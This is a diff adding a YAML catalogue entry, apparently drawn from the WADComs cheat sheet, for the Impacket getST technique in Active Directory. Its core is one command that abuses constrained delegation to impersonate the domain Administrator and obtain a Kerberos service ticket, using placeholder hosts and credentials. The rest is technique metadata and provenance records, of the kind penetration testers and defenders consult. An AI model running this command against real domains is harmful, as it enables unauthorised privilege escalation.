@@ -1,0 +1,121 @@
+id: wadcoms/Impacket-getST-Creds
+type: technique
+platform: active-directory
+name: Impacket getST Creds
+phases:
+- execution
+- privilege-escalation
+- persistence
+capabilities:
+- command-execution
+- privilege-escalation
+- persistence
+privilege_required: domain-user
+sources:
+- project: WADComs
+  upstream_url: https://wadcoms.github.io
+  license: GPL-3.0
+  upstream_version: 0c4609d7dffa7c12a378863a360636c9f275b240
+  last_synced: '2026-11-13'
+preconditions:
+- a valid username
+- a valid password
+commands:
+- template: python3 getST.py -spn www/server01.test.local -dc-ip 10.10.10.1 -impersonate Administrator
+    test.local/john:password123
+  comment: "Impacket's getST.py will request a Service Ticket and save it as ccache. If the account has\
+    \ constrained delegation privileges, you can use the `-impersonate` flag to request a ticket on behalf\
+    \ of another user. The following command will impersonate the Administrator account and request a\
+    \ Service Ticket on its behalf for the `www` service on host `server01.test.local`.\n\nCommand Reference:\n\
+    \n\tTarget IP: 10.10.10.1\n\n\tDomain: test.local\n\n\tService: www\n\n\tHost Name: server01.test.local\n\
+    \n\tUsername: john\n\n\tPassword: password123\n\n\tImpersonated User: Administrator\n"
+references:
+- https://github.com/SecureAuthCorp/impacket/blob/master/examples/getST.py
+- http://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html
+tags:
+- active-directory
+- wadcoms
+- kerberos
+source_data:
+  WADComs:
+    raw:
+      file: Impacket-getST-Creds.md
+      document: "---\ndescription: |\n  Impacket's getST.py will request a Service Ticket and save it\
+        \ as ccache. If the account has constrained delegation privileges, you can use the `-impersonate`\
+        \ flag to request a ticket on behalf of another user. The following command will impersonate the\
+        \ Administrator account and request a Service Ticket on its behalf for the `www` service on host\
+        \ `server01.test.local`.\n\n  Command Reference:\n\n  \tTarget IP: 10.10.10.1\n\n  \tDomain: test.local\n\
+        \n  \tService: www\n\n  \tHost Name: server01.test.local\n\n  \tUsername: john\n\n  \tPassword:\
+        \ password123\n\n  \tImpersonated User: Administrator\n\ncommand: |\n  python3 getST.py -spn www/server01.test.local\
+        \ -dc-ip 10.10.10.1 -impersonate Administrator test.local/john:password123\nitems:\n  - Username\n\
+        \  - Password\nservices:\n  - Kerberos\nOS:\n  - Linux\n  - Windows\nattack_types:\n  - Exploitation\n\
+        \  - PrivEsc\n  - Persistence\nreferences:\n  - https://github.com/SecureAuthCorp/impacket/blob/master/examples/getST.py\n\
+        \  - http://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html\n---\n"
+    upstream_url: https://wadcoms.github.io
+    upstream_version: 0c4609d7dffa7c12a378863a360636c9f275b240
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: command-execution
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+      note: 'exact D2 mapping of upstream attack_types value: Exploitation'
+    confidence:
+      level: high
+  - value: privilege-escalation
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+      note: 'exact D2 mapping of upstream attack_types value: PrivEsc'
+    confidence:
+      level: high
+  - value: persistence
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+      note: 'exact D2 mapping of upstream attack_types value: Persistence'
+    confidence:
+      level: high
+  phases:
+  - value: execution
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+      note: 'exact D2 mapping of upstream attack_types value: Exploitation'
+    confidence:
+      level: high
+  - value: privilege-escalation
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+      note: 'exact D2 mapping of upstream attack_types value: PrivEsc'
+    confidence:
+      level: high
+  - value: persistence
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+      note: 'exact D2 mapping of upstream attack_types value: Persistence'
+    confidence:
+      level: high
+  privilege_required:
+    value: domain-user
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    WADComs: sha256:af14197416116df33d600aef419adb7dba86e93b38694dced4f292c3416a9dbb
